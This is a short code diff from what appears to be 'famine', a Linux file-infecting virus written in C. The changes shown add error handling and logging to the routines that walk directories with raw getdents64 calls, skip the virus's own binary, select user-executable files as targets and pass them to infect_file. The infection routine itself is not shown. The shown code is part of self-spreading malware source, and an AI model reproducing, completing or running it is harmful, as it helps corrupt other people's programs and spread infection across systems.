@@ -13,8 +13,11 @@ static inline bool is_infectable(const char *filename, const unsigned char type)
 	if (_strcmp(filename, "./famine") == 0)
 		return false;
 
-	if (_stat(filename, &statbuf) == -1)
+	if (_stat(filename, &statbuf) < 0)
+	{
+		ERR(filename);
 		return false;
+	}
 
 	return statbuf.st_mode & S_IXUSR;
 }
@@ -38,13 +41,16 @@ static inline void update_directory(struct directory *dir, const char *filename)
 void famine(struct directory *dir)
 {
 	int fd = 0;
-	register int index = 0;
+	int index = 0;
 	int limit = 0;
 	char buf[BUFF_SIZE];
 	struct linux_dirent64 *dirp;
 
-	if ((fd = _open(dir->path, O_RDONLY | O_DIRECTORY, 0000)) == -1)
+	if ((fd = _open(dir->path, O_RDONLY | O_DIRECTORY, 0000)) < 0)
+	{
+		ERR("open");
 		return ;
+	}
 	
 	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
 	{
@@ -53,6 +59,7 @@ void famine(struct directory *dir)
 			dirp = (struct linux_dirent64 *)(buf + index);
 
 			update_directory(dir, dirp->d_name);
+			LOG(dir->buf);
 
 			if (is_infectable(dir->buf, dirp->d_type) == true)
 				infect_file(dir->buf);
